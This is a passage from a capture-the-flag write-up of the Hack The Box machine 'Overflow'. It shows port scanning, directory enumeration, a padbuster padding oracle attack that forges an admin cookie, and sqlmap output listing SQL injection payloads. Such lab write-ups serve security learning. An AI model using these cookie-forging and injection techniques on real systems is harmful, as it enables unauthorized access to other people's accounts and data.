<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 2.2">

    <!-- Primary Meta Tags -->
    <title>Overflow</title>
    <meta name="title" content="Overflow">
    <meta name="description" content="IP: 10.10.11.119" />

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://caueb.github.io/writeups/htb/machines/overflow/">
    <meta property="og:title" content="Overflow">
    <meta property="og:description" content="IP: 10.10.11.119">
    <meta property="og:image" content="https://caueb.github.io/writeups/htb/machines/overflow/images/image1.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/machines/overflow/">
    <meta property="twitter:title" content="Overflow">
    <meta property="twitter:description" content="IP: 10.10.11.119">
    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/machines/overflow/images/image1.png">

    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="/resources/css/retype.css?v=2.2.704948006820" rel="stylesheet" data-turbo-track="reload" />

    <script type="text/javascript" src="/resources/js/config.js?v=2.2.704948006820" defer data-turbo-track="reload"></script>
    <script type="text/javascript" src="/resources/js/retype.js?v=2.2" defer data-turbo-track="reload"></script>
    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.704948006820" defer></script>
    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.2.704948006820" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="/" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="md:mr-6">
                                <a class="inline-flex items-center py-2 md:mb-0 text-sm text-gray-400 whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
                            <li class="md:mr-6">
                                <a class="inline-flex items-center py-2 md:mb-0 text-sm text-gray-400 whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 00-1.75 0l-8.25 4.762a1.75 1.75 0 00-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 001.75 0l8.25-4.762a1.75 1.75 0 00.875-1.516V6.917a1.75 1.75 0 00-.875-1.515L12.876.639zm-1 1.298a.25.25 0 01.25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421l7.625-4.402a.25.25 0 00.125-.216V7.639l-7.75 4.474v8.947z"/>
                                        </g>
                                    </svg>
                                    <span>HackTheBox</span>
                                </a>
                            </li>
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
        
                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
                        </div>
        
                        <!-- Mobile search button mock -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placehokder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button mock -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
                </div>
            
                <div class="pl-6 mb-4 mt-1">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb">GitHub</a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913">HackTheBox</a>
                                    </li>
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="grow min-w-0 px-6 md:px-16">
                        <main class="relative pt-6 pb-16">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                
                                <!-- Page content  -->
<doc-anchor-target id="overflow" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#overflow">#</doc-anchor-trigger>
        <span>Overflow</span>
    </h1>
</doc-anchor-target>
<p>IP: 10.10.11.119</p>
<doc-anchor-target id="nmap---port-scan">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap---port-scan">#</doc-anchor-trigger>
        <span>Nmap - Port Scan</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="all-ports">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#all-ports">#</doc-anchor-trigger>
        <span>All ports</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.119

PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="service--safe-scripts">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#service--safe-scripts">#</doc-anchor-trigger>
        <span>Service &amp; Safe Scripts</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p22,25,80 10.10.11.119 -o nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 18:04 AWST
Nmap scan report for 10.10.11.119
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="port-80---http">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80---http">#</doc-anchor-trigger>
        <span>Port 80 - HTTP</span>
    </h2>
</doc-anchor-target>
<p>Before we start digging into the machine I added the IP address to my <code v-pre>/etc/hosts</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">10.10.11.119    overflow.htb</code></pre>
</doc-codeblock></div>
<p>Going to <a href="http://overflow.htb/">http://overflow.htb/</a> we see a website with only &quot;Sign In&quot; and &quot;Sign Up&quot; functionalities:
<figure class="content-center">
    <img src="images/image1.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>I first tried some default credentials but nothing works, so I registered a new user <code v-pre>caue:password</code>. The application automatically log me in as I sign up. Notice the redirect to <code v-pre>/home/index.php</code>, and other options are now available:
<figure class="content-center">
    <img src="images/image2.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<ul>
<li>Profile: Static profile page</li>
<li>Blog: Static blog page</li>
<li>Pricing: Redirects to home page</li>
<li>Log out: Log out and redirect to home page</li>
</ul>
<p>Nothing much we can do. I decided to run gobuster and also look at the cookies.</p>
<doc-anchor-target id="gobuster">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#gobuster">#</doc-anchor-trigger>
        <span>Gobuster</span>
    </h3>
</doc-anchor-target>
<p>Gobuster the root directory:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt

===============================================================
/login.php            (Status: 200) [Size: 1878]
/index.php            (Status: 200) [Size: 12227]
/register.php         (Status: 200) [Size: 2060] 
/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]
/config               (Status: 301) [Size: 313] [--&gt; http://overflow.htb/config/]
/home                 (Status: 301) [Size: 311] [--&gt; http://overflow.htb/home/]  
/assets               (Status: 301) [Size: 313] [--&gt; http://overflow.htb/assets/]</code></pre>
</doc-codeblock></div>
<p>Gobuster the <code v-pre>/home</code> directory:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$ gobuster dir -u http://overflow.htb/home -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt

===============================================================
/index.php            (Status: 302) [Size: 12503] [--&gt; ../login.php]
/profile              (Status: 301) [Size: 319] [--&gt; http://overflow.htb/home/profile/]
/logs.php             (Status: 200) [Size: 14]                                         
/blog.php             (Status: 200) [Size: 2971]                                       
/.                    (Status: 302) [Size: 12503] [--&gt; ../login.php]</code></pre>
</doc-codeblock></div>
<p>Accessing <code v-pre>/home/logs.php</code> we get &quot;Unauthorized!!&quot; message:
<figure class="content-center">
    <img src="images/image3.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Probably we need to be a user with high privileges.</p>
<doc-anchor-target id="cookies">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cookies">#</doc-anchor-trigger>
        <span>Cookies</span>
    </h3>
</doc-anchor-target>
<p>Lets take a look at the cookies:
<figure class="content-center">
    <img src="images/image4.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Tried to decode the cookies but didn&#x27;t get any information back, it looks like there is some cipher behind it. However, modifying the cookie adding or removing characters, we get redirected and an error message:
<figure class="content-center">
    <img src="images/image5.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>This could be indicative of CBC encryption, which can be reversed using a Padding Oracle Attack.
We’ll use <em>padbuster</em> to attempt the padding oracle attack.</p>
<ul>
<li><code v-pre>sudo apt install padbuster</code></li>
</ul>
<p>Padbuster is a tool able to decrypt ciphertext, encrypt paintext, and perform analysis. In another words, it can decrypt the cookie and also generate a new cookie with the text provided. So first we need to know what is that cookie so we can generate an admin cookie.</p>
<p>The original cookie from my screenshot seemed to have expired. I think there is some kind of database cleanup schedule running. So I registered a new account and extracted the cookie. Now we put this into our <em>padbuster</em> command:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 1878

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1878    N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (250/256) [Byte 8]
[+] Success: (211/256) [Byte 7]
[+] Success: (9/256) [Byte 6]
[+] Success: (88/256) [Byte 5]
[+] Success: (166/256) [Byte 4]
[+] Success: (70/256) [Byte 3]
[+] Success: (92/256) [Byte 2]
[+] Success: (115/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 6218f9b3d2e036fc
[+] Intermediate Bytes (HEX): 85a3bc5facf42f07
[+] Plain Text: user=cau

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 1.
*** Starting Block 2 of 2 ***

[+] Success: (6/256) [Byte 8]
[+] Success: (205/256) [Byte 7]
[+] Success: (28/256) [Byte 6]
[+] Success: (47/256) [Byte 5]
[+] Success: (79/256) [Byte 4]
[+] Success: (8/256) [Byte 3]
[+] Success: (232/256) [Byte 2]
[+] Success: (241/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): ecdde3d239c1a1a8
[+] Intermediate Bytes (HEX): 071ffeb4d5e731fb
[+] Plain Text: e

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=caue

[+] Decrypted value (HEX): 757365723D6361756507070707070707

[+] Decrypted value (Base64): dXNlcj1jYXVlBwcHBwcHBw==

-------------------------------------------------------</code></pre>
</doc-codeblock></div>
<p>We have successfully decrypted the cookie! The cipher value is <code v-pre>user=caue</code>, which was the username registered. Now that we know the cipher value syntax, we’ll use <em>padbuster</em> to generate a new cipher for admin:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0 -plaintext &quot;user=admin&quot;

...[snip]...

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------</code></pre>
</doc-codeblock></div>
<p>Great! We have the <code v-pre>admin</code> cookie! We can open the browser developer tools and change the current cookie to this one. As soon as we refresh the page we get an &quot;Admin Panel&quot; menu option:
<figure class="content-center">
    <img src="images/image6.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Clicking in the &quot;Admin Panel&quot; takes us to <a href="http://overflow.htb/admin_cms_panel/admin/login.php">http://overflow.htb/admin_cms_panel/admin/login.php</a>. It is a CMS Made Simple portal. There are a lot of exploits for this application but they most require authentication and we don&#x27;t have credentials yet.</p>
<doc-anchor-target id="logs">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#logs">#</doc-anchor-trigger>
        <span>Logs</span>
    </h3>
</doc-anchor-target>
<p>Decided to go back to <code v-pre>/home</code> and take a look at the &quot;Logs&quot;. Since we were not authorized before, lets see what happend with admin cookie:
<figure class="content-center">
    <img src="images/image7.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Clicking in the &quot;Logs&quot; menu bar opens a popup dialog displaying the last login times of the user. If we look in the browser developer tools, we can see an interesting JavaScript being loaded <code v-pre>../config/admin_last_login.js</code>. Lets take a look at it.
<figure class="content-center">
    <img src="images/image8.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Basically, it is fetching data from <code v-pre>http://overflow.htb/home/logs.php?name=admin</code>. Going to that URL we can confirm that:
![[image9.png]]</p>
<p>Every time a web application have a parameter that the user can control, we should test for weak sanitization. I will make this request again, intercept with Burp, save it to a file and use sqlmap to check for injections.</p>
<doc-anchor-target id="sqlmap">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sqlmap">#</doc-anchor-trigger>
        <span>SQLmap</span>
    </h3>
</doc-anchor-target>
<p>Request saved from Burp (important to keep the cookie for authentication!):</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">GET /home/logs.php?name=admin HTTP/1.1
Host: overflow.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA; CMSSESSIDf25decdf38ae=8tv8s7kevmh1c5nb5ji39e7ae4
Upgrade-Insecure-Requests: 1</code></pre>
</doc-codeblock></div>
<p>Testing for SQL injections:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$ sqlmap -r logs.req --batch
                                                     
       __H__                                                                                                                                           
 ___ ___[)]_____ ___ ___  {1.6.3#stable}                                                                                                               
|_ -| . [)]     | .'| . |                                                                                                                              
|___|_  [,]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           
                                                                                                                                                       
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all ap
plicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program         
                                                                                                                                                       
[*] starting @ 09:43:11 /2022-03-22/

...[snip]...

sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=admin') AND 5589=5589 AND ('DNaJ'='DNaJ

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin') AND (SELECT 8574 FROM (SELECT(SLEEP(5)))xsgZ) AND ('KDae'='KDae

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x7171786a71,0x4b6b4e524f4c51667345537049627879587273746d566d4474634f6b77594c746e4e496e4c4b5657,0x7162627871)-- -
---
[09:43:44] [INFO] the back-end DBMS is MySQL
